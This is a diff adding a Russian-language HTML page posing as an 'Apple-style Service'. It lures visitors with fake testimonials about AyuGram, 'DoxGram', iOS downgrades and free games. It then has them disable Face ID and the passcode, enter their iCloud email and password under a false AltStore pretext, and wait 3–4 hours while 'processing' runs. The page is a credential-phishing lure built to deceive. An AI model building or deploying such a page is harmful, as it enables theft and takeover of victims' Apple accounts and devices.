@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple-style Service</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Добро пожаловать</h1>
+        <div class="reviews">
+            <p>👹 "DoxGram получил, всё работает!" – @user1</p>
+            <p>👾 "AyuGram скачал, спасибо!" – @user2</p>
+            <p>🔁 "Откатился с iOS26 на 18 без проблем" – @user3</p>
+            <p>🧩 "Майнкрафт, ФНАФ, Nulls Brawl – всё дали!" – @user4</p>
+        </div>
+        <button id="detailsBtn">Подробнее</button>
+    </div>
+
+    <div id="modal" class="modal hidden">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <p>Что вам нужнее?</p>
+            <div class="options">
+                <button data-option="ayugram">👾 AyuGram</button>
+                <button data-option="doxgram">👹 DoxGram</button>
+                <button data-option="rollback">🔁 Откат iOS</button>
+                <button data-option="games">🧩 Minecraft, FNAF и др.</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="step1" class="step hidden">
+        <h2>Шаг 1: Отключите Face ID и код-пароль</h2>
+        <p>Перейдите в Настройки → Face ID и код-пароль → Отключить.</p>
+        <button id="continueBtn">Продолжить</button>
+    </div>
+
+    <div id="step2" class="step hidden">
+        <h2>Шаг 2: Введите данные iCloud</h2>
+        <input type="email" id="email" placeholder="Почта iCloud" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <p class="info">Мы требуем эти данные, чтобы установить AltStore. <a href="#" id="whyLink">Зачем?</a></p>
+        <div id="whyText" class="hidden">
+            <p>AltStore нужен для установки приложений вне App Store. Если не верите, вбейте в YouTube/TikTok "AltStore" – убедитесь сами.</p>
+        </div>
+        <input type="text" id="model" placeholder="Модель iPhone/iPad (например, iPhone 15 Pro)">
+        <button id="submitBtn">Отправить</button>
+    </div>
+
+    <div id="step3" class="step hidden">
+        <h2>Ожидайте 3-4 часа</h2>
+        <p>Идёт обработка. Убедитесь, что интернет стабилен. Страница закроется автоматически после завершения.</p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
